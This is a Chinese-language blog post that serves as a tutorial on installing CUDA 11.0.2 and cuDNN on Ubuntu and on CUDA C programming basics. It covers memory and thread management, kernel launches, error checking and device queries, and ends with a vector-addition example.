                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2025-04-28 16:08:39" itemprop="dateModified" datetime="2025-04-28T16:08:39+08:00">2025-04-28</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Cuda/" itemprop="url" rel="index"><span itemprop="name">Cuda</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><ul>
<li>cuda相关的理论基础</li>
</ul>
<h2 id="cuda安装"><a href="#cuda安装" class="headerlink" title="cuda安装"></a>cuda安装</h2><ul>
<li><p>从NVIDIA官网CUDA下载页面: <a target="_blank" rel="noopener" href="https://developer.nvidia.com/cuda-toolkit-archive">https://developer.nvidia.com/cuda-toolkit-archive</a> 点击CUDA Toolkit 11.0.2下载相应版本的CUDA11.0.2。</p>
</li>
<li><p>依次选择 Linux， x86_64, Ubuntu, 20.04。然后弹出三种安装方法，根据安装经验，推荐采用runfile(local)方法。这是由于CUDA的安装过程中需要很多依赖库文件，CUDA的run文件虽然比另外两种安装方法的文件大，但是他包含了所有的依赖库文件，所以相对来说很容易安装成功。</p>
</li>
<li><p>在安装CUDA之前需要先安装一些相互依赖的库文件</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt-get install freeglut3-dev build-essential libx11-dev libxmu-dev libxi-dev libgl1-mesa-glx libglu1-mesa libglu1-mesa-dev</span><br></pre></td></tr></table></figure>
</li>
<li><p>下面为安装CUDA11.0.2的Ubuntu安装指令</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget https://developer.download.nvidia.com/compute/cuda/11.0.2/local_installers/cuda_11.0.2_450.51.05_linux.run</span><br><span class="line"><span class="built_in">sudo</span> sh cuda_11.0.2_450.51.05_linux.run</span><br></pre></td></tr></table></figure></li>
<li><p>运行上面指令后，会弹出如下界面，点击Continue，然后再输入accept</p>
</li>
<li><p>接着，如下图所示，在弹出的界面中通过Enter键，取消Driver和450.51.05的安装，然后点击Install，等待</p>
</li>
<li><p>配置CUDA的环境变量</p>
<ul>
<li>CUDA安装完成之后，需要配置变量环境才能正常使用，在.bashrc文件的最后添加以下CUDA环境变量配置信息<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$PATH</span>:/usr/local/cuda/bin  </span><br><span class="line"><span class="built_in">export</span> LD_LIBRARY_PATH=<span class="variable">$LD_LIBRARY_PATH</span>:/usr/local/cuda/lib64  </span><br><span class="line"><span class="built_in">export</span> LIBRARY_PATH=<span class="variable">$LIBRARY_PATH</span>:/usr/local/cuda/lib64</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
<h2 id="cudnn安装"><a href="#cudnn安装" class="headerlink" title="cudnn安装"></a>cudnn安装</h2><ul>
<li>安装CUDA对应的cudnn 网址: <a target="_blank" rel="noopener" href="https://developer.nvidia.com/rdp/cudnn-download">https://developer.nvidia.com/rdp/cudnn-download</a></li>
<li>对下载的 cudnn-11.0-linux-x64-v8.0.5.39.tgz 进行解压操作，得到一个文件夹cuda，命令为<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -zxvf cudnn-11.0-linux-x64-v8.0.5.39.tgz</span><br></pre></td></tr></table></figure></li>
<li>然后，使用下面两条指令复制cuda文件下的文件到 &#x2F;usr&#x2F;local&#x2F;cuda&#x2F;lib64和 &#x2F;usr&#x2F;local&#x2F;cuda&#x2F;include&#x2F; 中<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cp</span> lib/* /usr/local/cuda/lib64/</span><br><span class="line"><span class="built_in">cp</span> include/* /usr/local/cuda/include/</span><br></pre></td></tr></table></figure></li>
<li>拷贝完成之后，我们可以使用如下的命令查看cuDNN的信息<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /usr/local/cuda-11.0/include/cudnn_version.h | grep CUDNN_MAJOR -A 2</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="cuda-C-编程"><a href="#cuda-C-编程" class="headerlink" title="cuda C 编程"></a>cuda C 编程</h2><ul>
<li><p>CPU编程和GPU编程的主要区别是程序员对GPU架构的熟悉程度。用并行思维进行思考并对GPU架构有了基本的了解，会使你编写规模达到成百上千个核的并行程序，如同写穿行程序一样简单</p>
</li>
<li><p>CUDA中有内存层次和线程层次的概念，使用如下结构有助于你对线程进行更高层次的控制和调度</p>
<ul>
<li>内存层次结构</li>
<li>线程层次结构</li>
</ul>
</li>
<li><p>CUDA抽象了硬件细节，且不需要将应用程序映射到传统图形API上。CUDA核中有三个关键抽象</p>
<ul>
<li>线程组的层次结构</li>
<li>内存的层次结构</li>
<li>障碍同步</li>
</ul>
</li>
<li><p>目标应该是学习GPU架构的基础及掌握CUDA开发工具和环境</p>
</li>
<li><p>CUDA开发环境。NVIDIA为C和C++开发人员提供了综合的开发环境以创建GPU加速应用程序，包括以下几种</p>
<ul>
<li>NVIDIA Nsight集成开发环境</li>
<li>CUDA—GDB命令行调试器</li>
<li>用于性能分析的可视化和命令行分析器</li>
<li>CUDA—MEMCHECK内存分析其</li>
<li>GPU设备管理工具</li>
</ul>
</li>
</ul>
<h2 id="cuda编程结构"><a href="#cuda编程结构" class="headerlink" title="cuda编程结构"></a>cuda编程结构</h2><ul>
<li><p>一个典型的CUDA编程结构包括五个主要步骤</p>
<ul>
<li>分配GPU内存</li>
<li>从CPU内存拷贝数据到GPU内存</li>
<li>调用CUDA内核函数来完成程序指定的运算</li>
<li>将数据从GPU拷回CPU内存</li>
<li>释放GPU内存空间</li>
</ul>
</li>
<li><p>CUDA编程模型使用由C语言扩展生成的主时代码在异构计算系统中执行应用程序。</p>
</li>
<li><p>在一个异构环境中包含多个CPU和GPU，每个GPU和CPU的内存都由一条PCI-Express总线分隔开。因此需要注意区分以下内容</p>
<ul>
<li>主机: CPU及其内存(主机内存)</li>
<li>设备: GPU及其内存(设备内存)</li>
</ul>
</li>
<li><p>从CUDA6.0开始，NVIDIA提出了名为”统一寻址(Unified Memory)”的编程模型的改进，它连接了主机内存和设备内存空间，可使用单个指针访问CPU和GPU内存，无序彼此之间手动拷贝数据。</p>
</li>
<li><p>现在，主要的是应学会如何为主机和设备分配内存空间以及如何在CPU和GPU之间拷贝共享数据。这种程序员管理模式控制下的内存和数据可以优化应用程序并实现硬件系统利用率的最大化</p>
</li>
<li><p>内核(kernel)是CUDA编程模型的一个重要组成部分，其代码在GPU上运行。作为一个开发人员，你可以串行执行核函数。在此背景下，CUDA的调度管理程序员在GPU线程上编写核函数。在主机上，基于应用程序数据以及GPU的性能定义如何让设备实现算法功能。这样做的目的是使你专注于算法的逻辑(通过编写串行代码)，且在创建和管理大量的GPU线程时不必拘泥于细节。</p>
</li>
<li><p>CUDA编程模型主要是异步的，因此在GPU上进行的运算可以与主机-设备通讯重叠。一个典型的CUDA程序包括由并行代码互补的串行代码。</p>
<ul>
<li>串行代码(及任务并行代码)在主机CPU上执行，而并行代码在GPU上执行。</li>
<li>主机代码按照ANSI C 标准进行编写，而设备代码使用CUDA C进行编写</li>
<li>你可以将所有的代码统一放在一个源文件中，也可以使用多个源文件来构建应用程序和库</li>
<li>NVIDIA的C编译器(nvcc)为主机和设备生成可执行代码</li>
</ul>
</li>
</ul>
<h2 id="cuda-内存管理"><a href="#cuda-内存管理" class="headerlink" title="cuda 内存管理"></a>cuda 内存管理</h2><ul>
<li><p>CUDA编程模型假设系统是由一个主机和一个设备组成的，而且各自拥有独立的内存。核函数是在设备上运行的。为使你拥有充分的控制权并使系统达到最佳性能，CUDA运行时负责分配和释放设备内存，并且在主机内存和设备内存之间传输数据</p>
</li>
<li><p>用于执行GPU内存分配的是cudaMalloc函数，其函数原型为:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cudaError_t <span class="title function_">cudaMalloc</span><span class="params">(<span class="type">void</span>** devPtr, <span class="type">size_t</span> size)</span></span><br></pre></td></tr></table></figure></li>
<li><p>该函数负责向设备分配一定字节的线性内存，并以devPtr的形式返回指向锁分配内存的指针。</p>
</li>
<li><p>cudaMalloc与标准C语言中的malloc函数几乎一样，只是次函数在GPU的内存里分配内存。</p>
</li>
<li><p>cudaMemcpy函数负责主机和设备之间的数据传输，其函数原型为:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cudaError_t <span class="title function_">cudaMemcpy</span><span class="params">(<span class="type">void</span>* dst, <span class="type">const</span> <span class="type">void</span>* src, <span class="type">size_t</span> count, cudaMemcpyKind kind)</span></span><br></pre></td></tr></table></figure></li>
<li><p>次函数从src指向的源存储区复制一定数量的字节到dst指向的目标存储区。复制方向由kind指定，其中的kind有以下几种</p>
<ul>
<li>cudaMemcpyHostToHost</li>
<li>cudaMemcpyHostToDevice</li>
<li>cudaMemcpyDeviceToHost</li>
<li>cudaMemcpyDeviceToDevice</li>
</ul>
</li>
<li><p>这个函数以同步方式执行，因为在cudaMemcpy函数返回以及传输操作完成之前主机应用程序是阻塞的</p>
</li>
<li><p>除了内核启动之外的CUDA调用都会返回一个错误的枚举类型cudaError_t</p>
<ul>
<li>如果GPU内存分配成功，函数返回cudaSuccess</li>
<li>否则返回cudaErrorMemoryAllocation</li>
</ul>
</li>
<li><p>可以使用CUDA运行时函数将错误代码转化为可读的错误消息</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span>* <span class="title function_">cudaGetErrorString</span><span class="params">(cudaError_t error)</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>在GPU内存层次结构中，最主要的两种内存是全局内存和共享内存。</p>
<ul>
<li>全局内存类似于CPU的系统内存</li>
<li>共享内存类似于CPU的缓存</li>
</ul>
</li>
<li><p>GPU的共享内存可以由CUDA C的内核直接控制</p>
</li>
</ul>
<h2 id="cuda-线程管理"><a href="#cuda-线程管理" class="headerlink" title="cuda 线程管理"></a>cuda 线程管理</h2><ul>
<li><p>当核函数在主机端启动时，它的执行会移动到设备上，此时设备中会产生大量的线程并且每个线程都执行由核函数指定的语句。</p>
</li>
<li><p>由一个内核启动所产生的所有线程统称为一个网格。同一网格中的所有线程共享相同的全局内存空间。</p>
</li>
<li><p>一个网格由多个线程块构成，一个线程块包含一组线程，同一线程快内的线程写作可以通过以下方式来实现</p>
<ul>
<li>同步</li>
<li>共享内存</li>
</ul>
</li>
<li><p>不同块内的线程不能协作</p>
</li>
<li><p>线程依靠以下两个坐标变量来区分彼此</p>
<ul>
<li>blockIdx(线程块在线程格内的索引)</li>
<li>threadIdx(块内的线程索引)</li>
</ul>
</li>
<li><p>这些变量是核函数中需要预初始化的内置变量。当执行一个核函数时，CUDA运行时为每个线程分配坐标变量blockIdx和threadIdx。基于这些坐标，你可以将部分数据分配给不同的线程</p>
</li>
</ul>
<h2 id="启动一个CUDA核函数"><a href="#启动一个CUDA核函数" class="headerlink" title="启动一个CUDA核函数"></a>启动一个CUDA核函数</h2><ul>
<li><p>CUDA内核调用是对C语言函数调用语句的延伸，<code>&lt;&lt;&lt;&gt;&gt;&gt;</code>运算符内是核函数的执行配置</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kernel_name &lt;&lt;&lt;grid, block&gt;&gt;&gt;(argument <span class="built_in">list</span>);</span><br></pre></td></tr></table></figure>
</li>
<li><p>利用执行配置可以指定线程在GPU上调度运行的方式。执行配置的第一个值是网格维度，也就是启动块的数目。第二个值是块维度，也就是每个块中线程的数目。通过指定网格和块的维度，你可以进行以下配置:</p>
<ul>
<li>内核中线程的数目</li>
<li>内核中使用的线程布局</li>
</ul>
</li>
<li><p>同一个块中的线程之间可以相互协作，不同块内的线程不能协作。</p>
</li>
<li><p>核函数的调用与主机线程是异步的。核函数调用结束后，控制权立刻返回给主机端。你可以调用以下函数来强制主机端程序等待所有的核函数执行结束</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cudaError_t <span class="title function_">cudaDeviceSynchronize</span><span class="params">(<span class="type">void</span>)</span>;</span><br></pre></td></tr></table></figure>
</li>
<li><p>一些cuda运行时API在主机和设备之间是隐式同步的。当使用cudaMemory函数在主机和设备之间拷贝数据时，主机端隐式同步，即主机端程序必须等待数据拷贝完成后才能继续执行程序。</p>
</li>
<li><p>不同于C语言的函数调用，所有的CUDA核函数的启动都是异步的。CUDA内核调用完成后，控制权立刻返回给CPU</p>
</li>
</ul>
<h2 id="编写核函数"><a href="#编写核函数" class="headerlink" title="编写核函数"></a>编写核函数</h2><ul>
<li><p>核函数是在设备端执行的代码。在核函数中，需要为一个线程规定要进行的计算以及要进行的数据访问。当核函数被调用时，许多不同的CUDA线程并行执行同一个计算任务。以下是用__global__声明定义核函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__global__ <span class="type">void</span> <span class="title function_">kernel_name</span><span class="params">(argument <span class="built_in">list</span>)</span>;</span><br></pre></td></tr></table></figure>
</li>
<li><p>函数类型限定符指定一个函数在主机上执行还是在设备上执行，以及可被主机调用还是被设备调用</p>
<ul>
<li><strong>global</strong> : 在设备端执行 可从主机端调用,也可以从计算能力为3的设备中调用 必须有一个void返回类型</li>
<li><strong>device</strong> : 在设备段执行 仅能从设备端调用</li>
<li><strong>host</strong>   : 在主机端执行 仅能从主机端调用</li>
</ul>
</li>
<li><p>__device__和__host__限定符可以一起使用，这样函数可以同时在主机和设备端进行编译</p>
</li>
<li><p>CUDA核函数的限制</p>
<ul>
<li>只能访问设备内存</li>
<li>必须具有void返回类型</li>
<li>不支持可变数量的参数</li>
<li>不支持静态变量</li>
<li>显示异步行为</li>
</ul>
</li>
</ul>
<h2 id="CUDA-处理错误"><a href="#CUDA-处理错误" class="headerlink" title="CUDA 处理错误"></a>CUDA 处理错误</h2><ul>
<li><p>由于许多CUDA调用是异步的，所以有时可能很难确定某个错误是由哪一步程序引起的。使用宏可以检查核函数的错误</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CHECK(cudaMemory(d_c, gpuRef, nBytes, cudaMemcpyHostToDevice));</span><br></pre></td></tr></table></figure>
</li>
<li><p>如果内存拷贝或之前的异步操作产生了错误，这个宏会报告错误代码并输出一个可读信息，然后停止程序。</p>
</li>
<li><p>也可以用下述方法，在核函数调用后检查核函数错误</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kernel_function&lt;&lt;&lt;grid, block&gt;&gt;&gt;(argument <span class="built_in">list</span>);</span><br><span class="line">CHECK(cudaDeviceSynchronize());</span><br></pre></td></tr></table></figure></li>
<li><p>CHECK(cudaDeviceSynchronize())会阻塞主机端线程的运行，直到设备端所有的请求任务都结束，并确保最后的核函数启动部分不会出错。</p>
</li>
</ul>
<h2 id="用nvprof工具计时"><a href="#用nvprof工具计时" class="headerlink" title="用nvprof工具计时"></a>用nvprof工具计时</h2><ul>
<li>自CUDA5.0以来，NVIDIA提供了一个名为nvprof的命令行分析工具，可以帮助从应用程序的CPU核GPU活动情况中获取时间线信息，其包括内核执行，内存传输以及CUDA API的调用，其用法如下<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nvprof [nvprof_args] &lt;application&gt; [application_args]</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="设备管理"><a href="#设备管理" class="headerlink" title="设备管理"></a>设备管理</h2><ul>
<li><p>NVIDIA提供了几个查询和管理GPU设备的方法。学会如何查询GPU设备信息是很重要的，因为在运行时你可以使用它来帮助设置内核执行配置</p>
</li>
<li><p>两种方法学习查询和管理GPU设备</p>
<ul>
<li>CUDA运行时API函数</li>
<li>NVIDIA系统管理界面(nvidia-smi)命令行程序</li>
</ul>
</li>
<li><p>使用以下函数查询关于GPU设备的所有信息</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cudaError_t <span class="title function_">cudaGetDeviceProperties</span><span class="params">(cudaDeviceProp* prop, <span class="type">int</span> device)</span>;</span><br></pre></td></tr></table></figure></li>
<li><p>cudaDeviceProp结构体返回GPU设备的属性。</p>
</li>
<li><p>使用nvidia-smi查询GPU信息</p>
<ul>
<li>要确定系统中安装了多少个GPU以及每个GPU的设备ID，可以使用以下命令<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nvidia-smi -L</span><br></pre></td></tr></table></figure></li>
<li>使用以下命令获取GPU 0的详细信息<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nvidia-smi -q -i 0</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
<h2 id="cuda-cudnn-tensorrt-之间存在什么关系"><a href="#cuda-cudnn-tensorrt-之间存在什么关系" class="headerlink" title="cuda cudnn tensorrt 之间存在什么关系"></a>cuda cudnn tensorrt 之间存在什么关系</h2><p>CUDA（Compute Unified Device Architecture）、cuDNN（CUDA Deep Neural Network）、和TensorRT（TensorRT）都是与GPU计算和深度学习相关的 NVIDIA 技术。</p>
<ol>
<li><p><strong>CUDA（Compute Unified Device Architecture）</strong>:</p>
<ul>
<li>CUDA 是 NVIDIA 提供的并行计算平台和编程模型，允许开发者使用通用编程语言（如C&#x2F;C++和Fortran）来编写支持GPU加速的程序。</li>
<li>CUDA 提供了 GPU 计算的基础设施，包括 GPU 内核函数、内存管理、线程调度等。</li>
</ul>
</li>
<li><p><strong>cuDNN（CUDA Deep Neural Network）</strong>:</p>
<ul>
<li>cuDNN 是 NVIDIA 提供的深度学习库，专门用于 GPU 加速的深度神经网络训练和推理。</li>
<li>它优化了深度学习算法的实现，提供了高性能的 GPU 实现，包括卷积、池化、归一化等操作，以加速深度学习模型的训练和推理过程。</li>
</ul>
</li>
<li><p><strong>TensorRT（Tensor Runtime）</strong>:</p>
<ul>
<li>TensorRT 是 NVIDIA 提供的用于高性能深度学习推理的库。它通过对模型进行优化和精简，以减少推理时的延迟和提高推理性能。</li>
<li>TensorRT 可以与 cuDNN 结合使用，对深度学习模型进行加速，同时还支持 INT8 等低精度推理。</li>
</ul>
</li>
</ol>
<p>关系：</p>
<ul>
<li>CUDA 提供了底层的 GPU 计算基础架构，cuDNN 利用 CUDA 提供的加速功能实现深度学习操作的高性能实现。</li>
<li>TensorRT 则建立在 CUDA 和 cuDNN 的基础上，专注于优化深度学习模型的推理过程，通过减少模型的计算负载和内存占用来提高推理性能。 TensorRT 还可以与 cuDNN 配合使用，以进一步优化深度学习模型的推理。</li>
</ul>
<p>总体而言，CUDA 提供了底层的 GPU 编程能力，cuDNN 是在 CUDA 上构建的深度学习库，而 TensorRT 是专注于优化深度学习推理的高性能库。</p>
<h2 id="C-cuda库是什么"><a href="#C-cuda库是什么" class="headerlink" title="C++ cuda库是什么"></a>C++ cuda库是什么</h2><p>在C++中，”CUDA库”通常指的是NVIDIA提供的CUDA（Compute Unified Device Architecture）工具包，它是用于并行计算的一组工具和API。CUDA库使得开发人员能够在NVIDIA GPU上进行通用目的的并行计算。</p>
<p>CUDA库包括以下主要组件：</p>
<ol>
<li><p><strong>CUDA Runtime库：</strong> 提供了一系列C语言风格的API，允许在CUDA设备（GPU）上执行并行计算。开发人员使用这些API来管理设备内存、启动GPU内核函数等。</p>
</li>
<li><p><strong>CUDA Driver库：</strong> 提供了与硬件交互的低级别接口，允许对GPU进行更直接的控制。一般情况下，开发人员更常用CUDA Runtime库，而不是直接使用Driver库。</p>
</li>
<li><p><strong>cuBLAS：</strong> 针对线性代数运算的CUDA库，提供了一组高性能的基本线性代数子程序（BLAS）。</p>
</li>
<li><p><strong>cuFFT：</strong> 针对快速傅里叶变换（FFT）的CUDA库，用于高性能的FFT计算。</p>
</li>
<li><p><strong>cuDNN：</strong> 深度神经网络库，提供了一组高性能的深度学习基本操作和算法，用于在GPU上进行深度学习推理和训练。</p>
</li>
<li><p><strong>NVRTC（NVIDIA Runtime Compiler）：</strong> 允许在运行时将CUDA C源代码编译为GPU代码的库。</p>
</li>
</ol>
<p>在使用CUDA库进行开发时，通常需要安装NVIDIA的GPU驱动、CUDA工具包以及适当版本的cuBLAS、cuFFT等库。开发人员可以使用CUDA C&#x2F;C++编写GPU内核函数，并通过调用CUDA库中的API来执行并行计算任务。</p>
<p>以下是一个简单的示例，展示了在C++中使用CUDA Runtime库执行向量加法的基本步骤：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// CUDA kernel函数，执行向量加法</span></span><br><span class="line"><span class="function">__global__ <span class="type">void</span> <span class="title">vectorAddition</span><span class="params">(<span class="type">float</span>* a, <span class="type">float</span>* b, <span class="type">float</span>* result, <span class="type">int</span> size)</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> idx = threadIdx.x + blockIdx.x * blockDim.x;</span><br><span class="line">    <span class="keyword">if</span> (idx &lt; size) &#123;</span><br><span class="line">        result[idx] = a[idx] + b[idx];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">const</span> <span class="type">int</span> size = <span class="number">1024</span>;</span><br><span class="line">    <span class="type">const</span> <span class="type">int</span> blockSize = <span class="number">256</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 分配主机内存</span></span><br><span class="line">    <span class="type">float</span>* hostA = <span class="keyword">new</span> <span class="type">float</span>[size];</span><br><span class="line">    <span class="type">float</span>* hostB = <span class="keyword">new</span> <span class="type">float</span>[size];</span><br><span class="line">    <span class="type">float</span>* hostResult = <span class="keyword">new</span> <span class="type">float</span>[size];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 初始化输入数据</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; size; ++i) &#123;</span><br><span class="line">        hostA[i] = i;</span><br><span class="line">        hostB[i] = <span class="number">2</span> * i;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 分配设备内存</span></span><br><span class="line">    <span class="type">float</span>* deviceA, *deviceB, *deviceResult;</span><br><span class="line">    <span class="built_in">cudaMalloc</span>(&amp;deviceA, size * <span class="built_in">sizeof</span>(<span class="type">float</span>));</span><br><span class="line">    <span class="built_in">cudaMalloc</span>(&amp;deviceB, size * <span class="built_in">sizeof</span>(<span class="type">float</span>));</span><br><span class="line">    <span class="built_in">cudaMalloc</span>(&amp;deviceResult, size * <span class="built_in">sizeof</span>(<span class="type">float</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将输入数据从主机复制到设备</span></span><br><span class="line">    <span class="built_in">cudaMemcpy</span>(deviceA, hostA, size * <span class="built_in">sizeof</span>(<span class="type">float</span>), cudaMemcpyHostToDevice);</span><br><span class="line">    <span class="built_in">cudaMemcpy</span>(deviceB, hostB, size * <span class="built_in">sizeof</span>(<span class="type">float</span>), cudaMemcpyHostToDevice);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 启动CUDA kernel</span></span><br><span class="line">    vectorAddition&lt;&lt;&lt;(size + blockSize - <span class="number">1</span>) / blockSize, blockSize&gt;&gt;&gt;(deviceA, deviceB, deviceResult, size);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将结果从设备复制到主机</span></span><br><span class="line">    <span class="built_in">cudaMemcpy</span>(hostResult, deviceResult, size * <span class="built_in">sizeof</span>(<span class="type">float</span>), cudaMemcpyDeviceToHost);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 打印结果</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; ++i) &#123;</span><br><span class="line">        std::cout &lt;&lt; hostResult[i] &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 释放内存</span></span><br><span class="line">    <span class="keyword">delete</span>[] hostA;</span><br><span class="line">    <span class="keyword">delete</span>[] hostB;</span><br><span class="line">    <span class="keyword">delete</span>[] hostResult;</span><br><span class="line">    <span class="built_in">cudaFree</span>(deviceA);</span><br><span class="line">    <span class="built_in">cudaFree</span>(deviceB);</span><br><span class="line">    <span class="built_in">cudaFree</span>(deviceResult);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上述示例使用CUDA Runtime库执行向量加法，其中CUDA kernel函数在GPU上并行执行。请注意，CUDA开发涉及到更多的细节和概念，这里只是一个简单的入门示例。</p>
<h2 id="C-cuda库-详解"><a href="#C-cuda库-详解" class="headerlink" title="C++ cuda库 详解"></a>C++ cuda库 详解</h2><p>CUDA（Compute Unified Device Architecture）是由NVIDIA提供的用于通用目的的并行计算框架。它允许开发人员使用C++或CUDA C等编程语言在NVIDIA GPU上执行并行计算任务。以下是关于CUDA库的一些详细信息：</p>
<h3 id="主要组件："><a href="#主要组件：" class="headerlink" title="主要组件："></a>主要组件：</h3><ol>
<li><p><strong>CUDA Runtime库：</strong> 提供了一系列C语言风格的API，用于在CUDA设备上执行并行计算。这包括设备管理、内存分配和释放、CUDA核函数的启动等功能。开发人员通常使用这些API进行CUDA编程。</p>
</li>
<li><p><strong>CUDA Driver库：</strong> 提供了更低级别的接口，允许直接与硬件进行交互。一般情况下，开发人员更多地使用CUDA Runtime库，而不是直接使用Driver库。</p>
</li>
<li><p><strong>cuBLAS（CUDA Basic Linear Algebra Subroutines）：</strong> 面向线性代数操作的库，提供高性能的基本线性代数子程序（BLAS）。</p>
</li>
<li><p><strong>cuFFT（CUDA Fast Fourier Transform）：</strong> 针对快速傅立叶变换（FFT）的库，用于高性能的FFT计算。</p>
</li>
<li><p><strong>cuRAND：</strong> 提供随机数生成功能的库，包括伪随机数生成器、分布等。</p>
</li>
<li><p><strong>cuSPARSE：</strong> 面向稀疏矩阵操作的库，提供高性能的稀疏矩阵运算。</p>
</li>
<li><p><strong>NVRTC（NVIDIA Runtime Compiler）：</strong> 允许在运行时将CUDA C源代码编译为GPU代码的库。这对于动态生成GPU核函数是有用的。</p>
</li>
</ol>
<h3 id="CUDA编程模型："><a href="#CUDA编程模型：" class="headerlink" title="CUDA编程模型："></a>CUDA编程模型：</h3><p>CUDA编程模型涉及在主机（CPU）和设备（GPU）之间进行数据传输，以及在GPU上并行执行核函数。以下是CUDA编程的一般步骤：</p>
<ol>
<li><p><strong>分配设备内存：</strong> 使用<code>cudaMalloc</code>等CUDA Runtime函数在GPU上分配内存。</p>
</li>
<li><p><strong>将数据从主机复制到设备：</strong> 使用<code>cudaMemcpy</code>将数据从主机复制到GPU。</p>
</li>
<li><p><strong>定义并启动CUDA核函数：</strong> 使用<code>__global__</code>修饰符定义CUDA核函数，并使用<code>&lt;&lt;&lt;...&gt;&gt;&gt;</code>语法启动并行执行。</p>
</li>
<li><p><strong>将数据从设备复制回主机：</strong> 使用<code>cudaMemcpy</code>将计算结果从GPU复制回主机。</p>
</li>
<li><p><strong>释放设备内存：</strong> 使用<code>cudaFree</code>等函数释放在GPU上分配的内存。</p>
</li>
</ol>
